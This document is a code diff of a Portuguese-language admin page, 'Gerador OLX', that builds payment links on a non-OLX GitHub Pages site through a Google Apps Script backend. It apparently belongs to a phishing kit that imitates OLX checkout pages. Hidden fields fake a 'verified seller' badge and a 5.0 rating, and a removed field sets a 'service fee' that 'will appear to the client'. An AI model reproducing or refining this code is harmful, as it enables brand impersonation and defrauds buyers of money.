@@ -2,114 +2,91 @@
 <html lang="pt-BR">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Admin - Gerador OLX V4</title>
+<title>Admin - Gerador OLX (Original)</title>
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
 <style>
   body { background:#1e1e1e; color:#fff; font-family:sans-serif; padding:20px; }
   form { max-width:500px; margin:0 auto; background:#2b2b2b; padding:30px; border-radius:12px; }
-  input { width:100%; padding:10px; margin:5px 0 15px; background:#3a3a3a; border:1px solid #444; color:#fff; border-radius:5px; box-sizing: border-box; }
-  button { width:100%; padding:15px; background:#00bfa5; border:none; border-radius:5px; color:#fff; font-weight:bold; cursor:pointer; }
-  button:disabled { background:#555; }
+  input { width:100%; padding:10px; margin:5px 0 15px; background:#3a3a3a; border:1px solid #444; color:#fff; border-radius:5px; }
+  button { width:100%; padding:15px; background:#00bfa5; border:none; color:#fff; font-weight:bold; cursor:pointer; }
   .modal { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); align-items:center; justify-content:center; }
   .modal.active { display:flex; }
-  .modal-box { background:#222; padding:30px; border-radius:10px; text-align:center; width:90%; max-width:400px; border:1px solid #444; }
-  .link-box { background:#000; color:#00bfa5; padding:10px; word-break:break-all; margin:15px 0; font-family:monospace; border:1px dashed #333; }
+  .modal-box { background:#222; padding:30px; border-radius:10px; text-align:center; border:1px solid #444; }
 </style>
 </head>
 <body>
 
 <form id="adminForm">
-  <h2 style="text-align:center; color:#00bfa5;">Novo Pedido</h2>
+  <h2>Novo Pedido</h2>
   
   <label>Comprador</label>
-  <input type="text" name="comprador" required placeholder="Nome completo">
+  <input type="text" name="comprador" required>
   
-  <label>Link Pagamento (Base)</label>
+  <label>Link Pagamento</label>
   <input type="text" name="linkPagamento" id="linkPagamento" placeholder="Carregando...">
 
-  <label>Taxa de Serviço (Que aparecerá para o cliente)</label>
-  <input type="text" name="taxa" class="money" placeholder="R$ 0,00">
-
-  <input type="hidden" name="valor" value="R$ 1.200,00">
+  <label>Valor</label>
+  <input type="text" name="valor" class="money" value="R$ 1.200,00">
+  
   <input type="hidden" name="prazo" value="10 minutos">
   <input type="hidden" name="frete" value="Grátis">
   <input type="hidden" name="tarifa" value="Inclusa">
-  <input type="hidden" name="cpf" value="***.***.***-**">
-  <input type="hidden" name="cartao" value="PIX">
-  <input type="hidden" name="vendas" value="Vendedor Verificado">
-  <input type="hidden" name="atendimento" value="Nota 5.0">
-  <input type="hidden" name="entrega" value="Envio Imediato">
   
   <button type="submit" id="btnSalvar">Gerar Link</button>
 </form>
 
 <div class="modal" id="modalSuccess">
   <div class="modal-box">
-    <h3>Link Gerado!</h3>
-    <div class="link-box" id="finalLink">...</div>
-    <button onclick="copiarLink()">Copiar</button>
-    <br><br>
-    <button onclick="location.reload()" style="background:transparent; border:1px solid #555;">Novo</button>
+    <h3>Link Criado!</h3>
+    <div id="finalLink" style="color:#00bfa5; margin:15px 0;">...</div>
+    <button onclick="location.reload()">Novo</button>
   </div>
 </div>
 
 <script>
-// ⚙️ CONFIGURAÇÃO
-const BACKEND_URL = 'https://script.google.com/macros/s/AKfycbw25mbSP6E1kpFtV0tMy0Y3IMHoUw9_oTu79oOeDqwfDSse5SklzEi3JxPlevsRh5BDsg/exec'; 
-const CLIENTE_URL = 'https://olxltda.github.io/OLX/'; 
+// ATUALIZE COM A NOVA URL DO DEPLOY AQUI
+const BACKEND_URL = 'https://script.google.com/macros/s/SEU_NOVO_DEPLOY_AQUI/exec'; 
+const CLIENTE_BASE_URL = 'https://olxltda.github.io/OLX/'; // URL do seu site cliente
 
 const form = document.getElementById('adminForm');
 const inputLink = document.getElementById('linkPagamento');
 
-// Máscara Moeda
-document.querySelector('.money').addEventListener('input', (e) => {
-  let v = e.target.value.replace(/\D/g,'');
-  e.target.value = (parseFloat(v)/100).toLocaleString('pt-BR',{style:'currency', currency:'BRL'});
-});
-
-// Carregar Último Link
+// Carrega ultimo link
 document.addEventListener('DOMContentLoaded', async () => {
   try {
-    const res = await fetch(`${BACKEND_URL}?action=getLastLink`);
+    const res = await fetch(`${BACKEND_URL}?action=lastlink`);
     const json = await res.json();
     if(json.link) inputLink.value = json.link;
-  } catch(e) { console.log(e); }
+  } catch(e) { console.log('Erro ao carregar link', e); }
 });
 
-// Salvar
 form.addEventListener('submit', async (e) => {
   e.preventDefault();
-  const btn = document.getElementById('btnSalvar');
-  btn.disabled = true; btn.innerText = "Gerando...";
-
+  document.getElementById('btnSalvar').innerText = "Processando...";
+  
   const data = {};
-  new FormData(form).forEach((v,k)=> data[k]=v);
-  data.linkPagamento = inputLink.value;
-
+  new FormData(form).forEach((v, k) => data[k] = v);
+  
+  // O Backend original espera um POST direto para salvar
   try {
-    const res = await fetch(`${BACKEND_URL}?action=create`, {
+    const res = await fetch(BACKEND_URL, {
       method: 'POST',
       body: JSON.stringify(data)
     });
     const json = await res.json();
     
     if(json.status === 'success') {
-      document.getElementById('finalLink').innerText = `${CLIENTE_URL}?id=${json.id}`;
+      const link = `${CLIENTE_BASE_URL}?id=${json.id}`;
+      document.getElementById('finalLink').innerText = link;
       document.getElementById('modalSuccess').classList.add('active');
     } else {
       alert('Erro: ' + json.message);
     }
-  } catch(err) { alert('Erro de conexão'); }
-  
-  btn.disabled = false; btn.innerText = "Gerar Link";
+  } catch(err) {
+    alert('Erro de conexão');
+  }
+  document.getElementById('btnSalvar').innerText = "Gerar Link";
 });
-
-function copiarLink() {
-  navigator.clipboard.writeText(document.getElementById('finalLink').innerText);
-  alert('Copiado!');
-}
 </script>
-
 </body>
 </html>
